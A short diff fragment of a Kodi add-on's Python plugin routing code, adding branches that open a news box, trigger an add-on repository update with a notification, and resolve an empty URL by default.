+elif mode[0] == 'open_news':
+    import newsbox
+    newsbox.welcome()
+
+elif mode[0] == 'forceupdate':
+    dialog = xbmcgui.Dialog()
+    dialog.notification(addonName, "Triggered a request for addon updates", ICON, 5000, sound=True)
+    xbmc.executebuiltin('UpdateAddonRepos')
+
+else:
+    xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
 
 xbmcplugin.endOfDirectory(addon_handle)
 
